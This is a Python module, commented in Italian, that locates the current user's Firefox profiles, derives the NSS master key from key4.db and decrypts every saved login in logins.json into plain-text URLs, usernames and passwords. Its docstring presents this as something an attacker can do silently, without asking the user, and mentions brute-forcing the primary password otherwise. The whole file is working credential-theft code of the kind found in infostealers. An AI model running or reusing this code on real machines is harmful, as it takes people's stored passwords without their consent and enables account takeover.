"""Decifrazione credenziali Firefox NSS (key4.db + logins.json).

Supporta:
  - Firefox 73+ (PBKDF2 + AES-256-CBC) - schema moderno
  - Firefox 144+ (logins.json con AES-GCM, raro) - opzionale

Differenze rispetto Chromium:
  - NSS NON usa DPAPI. Usa una "Primary Password" (master password) custom.
  - Senza primary password configurata, c'e' comunque una "empty primary"
    che viene usata per derivare la key — quindi le credenziali sono
    decifrabili user-mode SENZA bisogno di chiedere niente all'utente.
  - Con primary password impostata, attacker deve fare brute force su di essa.

Riferimenti:
  - https://github.com/lclevy/firepwd
  - https://github.com/Sohimaster/Firefox-Passwords-Decryptor
"""
from __future__ import annotations
import base64
import hashlib
import hmac
import json
import os
import shutil
import sqlite3
import tempfile
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False


# ============================================================
# ASN.1 minimal parser (no pyasn1 dependency)
# ============================================================
def _parse_asn1(data: bytes, off: int = 0):
    """Parser ASN.1 DER minimale.

    Ritorna (tag, length, value_bytes, next_offset).
    """
    if off >= len(data):
        return None, 0, b"", off
    tag = data[off]
    off += 1
    if off >= len(data):
        return tag, 0, b"", off
    length = data[off]
    off += 1
    if length & 0x80:
        nbytes = length & 0x7F
        length = int.from_bytes(data[off:off + nbytes], "big")
        off += nbytes
    value = data[off:off + length]
    return tag, length, value, off + length


def _parse_pbe_blob(blob: bytes):
    """Parsa un blob NSS PBE (ASN.1) restituendo (algorithm_oid_bytes, salt, iv,
    iter_count, ciphertext).

    Struttura tipica Firefox 73+:
      SEQUENCE {
        SEQUENCE {              -- PBES2-params
          OID,                  -- pbes2 (1.2.840.113549.1.5.13) o pbeWithSha1AndDES (legacy)
          SEQUENCE {
            SEQUENCE {          -- KDF
              OID,              -- PBKDF2
              SEQUENCE { salt, iter, [keyLen], [prf] }
            },
            SEQUENCE {          -- enc
              OID,              -- AES-256-CBC (2.16.840.1.101.3.4.1.42)
              OCTET STRING      -- IV
            }
          }
        },
        OCTET STRING            -- ciphertext
      }
    """
    # SEQUENCE outer
    tag, _, value, _ = _parse_asn1(blob)
    if tag != 0x30:
        return None
    # Inside: SEQUENCE (params), OCTET STRING (ct)
    tag1, _, v1, off1 = _parse_asn1(value, 0)
    tag2, _, v2, _ = _parse_asn1(value, off1)
    if tag1 != 0x30 or tag2 != 0x04:
        return None
    ciphertext = v2
    # Inside params: OID (algo), SEQUENCE (PBES2 params)
    _, _, oid_main, off_p1 = _parse_asn1(v1, 0)
    _, _, params, _ = _parse_asn1(v1, off_p1)
    # params: SEQUENCE { kdf-spec, enc-spec }
    tag_kdf, _, kdf_seq, off_kdf = _parse_asn1(params, 0)
    tag_enc, _, enc_seq, _ = _parse_asn1(params, off_kdf)
    # kdf-spec: SEQUENCE { OID, SEQUENCE { salt, iter, [keyLen], [prf] } }
    _, _, _kdf_oid, off_kdf2 = _parse_asn1(kdf_seq, 0)
    _, _, kdf_params, _ = _parse_asn1(kdf_seq, off_kdf2)
    _, _, salt, off_s = _parse_asn1(kdf_params, 0)
    _, _, iter_bytes, off_i = _parse_asn1(kdf_params, off_s)
    iter_count = int.from_bytes(iter_bytes, "big")
    key_len = 32  # default for AES-256
    # Try to read keyLen if present (3rd element)
    if off_i < len(kdf_params):
        try:
            _, _, kl_bytes, _ = _parse_asn1(kdf_params, off_i)
            if kl_bytes:
                key_len = int.from_bytes(kl_bytes, "big")
        except Exception:
            pass
    # enc-spec: SEQUENCE { OID (AES-CBC), OCTET STRING (IV) }
    _, _, _enc_oid, off_e1 = _parse_asn1(enc_seq, 0)
    _, _, iv, _ = _parse_asn1(enc_seq, off_e1)
    return {
        "salt": salt,
        "iter": iter_count,
        "key_len": key_len,
        "iv": iv,
        "ciphertext": ciphertext,
    }


# ============================================================
# Firefox profili discovery
# ============================================================
def discover_firefox_profiles() -> list[Path]:
    """Trova i profili Firefox per l'utente corrente."""
    base = Path(os.environ.get("APPDATA", "")) / "Mozilla/Firefox/Profiles"
    if not base.exists():
        return []
    profiles = []
    for sub in base.iterdir():
        if sub.is_dir() and (sub / "key4.db").exists():
            profiles.append(sub)
    return profiles


# ============================================================
# Decifrazione NSS
# ============================================================
def _derive_key_pbkdf2(password: bytes, salt: bytes, iters: int, dklen: int) -> bytes:
    return hashlib.pbkdf2_hmac("sha256", password, salt, iters, dklen=dklen)


def _aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes | None:
    if not _HAS_CRYPTO:
        return None
    try:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv),
                        backend=default_backend())
        dec = cipher.decryptor()
        plain = dec.update(ct) + dec.finalize()
        # PKCS7 unpad
        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            return plain[:-pad_len]
        return plain
    except Exception:
        return None


def get_firefox_master_key(profile_path: Path,
                            primary_password: str = "") -> bytes | None:
    """Estrae la master key da key4.db.

    Se l'utente ha impostato una Primary Password, va passata.
    Default vuota = caso piu' comune.
    """
    key4 = profile_path / "key4.db"
    if not key4.exists():
        return None
    tmp = Path(tempfile.gettempdir()) / f"ff_key4_{os.getpid()}.db"
    try:
        shutil.copy(key4, tmp)
        con = sqlite3.connect(tmp)
        cur = con.cursor()

        # 1. Estrai globalSalt + item2 da metadata WHERE id='password'
        cur.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        row = cur.fetchone()
        if not row:
            con.close()
            return None
        global_salt, item2_blob = row
        global_salt = bytes(global_salt)
        item2_blob = bytes(item2_blob)

        # 2. Parsa item2 per ottenere parametri PBE
        params = _parse_pbe_blob(item2_blob)
        if not params:
            con.close()
            return None

        # 3. Verifica decifrazione di password-check
        pbe_password = hashlib.sha1(global_salt + primary_password.encode("utf-8")).digest()
        derived = _derive_key_pbkdf2(pbe_password, params["salt"],
                                     params["iter"], params["key_len"])
        check_plain = _aes_cbc_decrypt(derived, params["iv"], params["ciphertext"])
        if check_plain is None or b"password-check" not in check_plain:
            # Master password sbagliata o schema legacy non supportato
            con.close()
            return None

        # 4. Estrai a11 (master key cifrata) da nssPrivate
        cur.execute("SELECT a11, a102 FROM nssPrivate")
        rows = cur.fetchall()
        con.close()

        for a11_b, a102_b in rows:
            if not a11_b:
                continue
            a11 = bytes(a11_b)
            # Parsa anche a11 come ASN.1
            mk_params = _parse_pbe_blob(a11)
            if not mk_params:
                continue
            mk_derived = _derive_key_pbkdf2(pbe_password, mk_params["salt"],
                                            mk_params["iter"], mk_params["key_len"])
            mk_plain = _aes_cbc_decrypt(mk_derived, mk_params["iv"],
                                        mk_params["ciphertext"])
            if mk_plain is None:
                continue
            # Master key = primi 24 byte (per 3DES) o 32 byte (per AES-256)
            # Heuristic: prendiamo i primi 24
            return mk_plain[:24] if len(mk_plain) >= 24 else mk_plain
        return None
    finally:
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass


def _des3_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes | None:
    """3DES-CBC (per logins.json legacy)."""
    if not _HAS_CRYPTO:
        return None
    try:
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv),
                        backend=default_backend())
        dec = cipher.decryptor()
        plain = dec.update(ct) + dec.finalize()
        pad_len = plain[-1]
        if 1 <= pad_len <= 8:
            return plain[:-pad_len]
        return plain
    except Exception:
        return None


def decrypt_firefox_login_field(master_key: bytes, b64_field: str) -> str | None:
    """Decifra un singolo username_field o password_field di logins.json.

    Il blob base64 contiene:
      SEQUENCE {
        OCTET STRING key_id (=CKA_ID),
        SEQUENCE { OID (3DES), OCTET STRING IV },
        OCTET STRING ciphertext
      }
    """
    try:
        blob = base64.b64decode(b64_field)
    except Exception:
        return None
    # SEQUENCE outer
    tag, _, value, _ = _parse_asn1(blob)
    if tag != 0x30:
        return None
    # 1: OCTET STRING (key_id)
    _, _, _key_id, off1 = _parse_asn1(value, 0)
    # 2: SEQUENCE { OID, OCTET STRING IV }
    _, _, alg_seq, off2 = _parse_asn1(value, off1)
    # 3: OCTET STRING ciphertext
    _, _, ct, _ = _parse_asn1(value, off2)
    # Inside alg_seq: OID, IV
    _, _, oid, off_iv = _parse_asn1(alg_seq, 0)
    _, _, iv, _ = _parse_asn1(alg_seq, off_iv)
    # 3DES-CBC decrypt with master_key (24 byte)
    plain = _des3_decrypt(master_key, iv, ct)
    if plain is None:
        return None
    try:
        return plain.decode("utf-8", errors="replace")
    except Exception:
        return None


def decrypt_firefox_logins(profile_path: Path,
                            primary_password: str = "") -> list[dict]:
    """Decifra tutte le credenziali Firefox di un profilo.

    Ritorna lista di {hostname, username, password, timeCreated, ...}.
    """
    if not _HAS_CRYPTO:
        return []
    logins_file = profile_path / "logins.json"
    if not logins_file.exists():
        return []
    master = get_firefox_master_key(profile_path, primary_password)
    if not master:
        return []

    try:
        with open(logins_file, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        return []

    results = []
    for entry in data.get("logins", []):
        host = entry.get("hostname", "")
        user_enc = entry.get("encryptedUsername", "")
        pwd_enc = entry.get("encryptedPassword", "")
        user = decrypt_firefox_login_field(master, user_enc)
        pwd = decrypt_firefox_login_field(master, pwd_enc)
        results.append({
            "url": host,
            "username": user or "",
            "password": pwd or "",
            "date_created": entry.get("timeCreated"),
            "times_used": entry.get("timesUsed", 0),
        })
    return results


def has_primary_password(profile_path: Path) -> bool:
    """Heuristic: il profilo ha una primary password impostata?

    Test: prova a derivare la master key con password vuota. Se fallisce,
    e' probabile che una primary password sia configurata.
    """
    return get_firefox_master_key(profile_path, "") is None
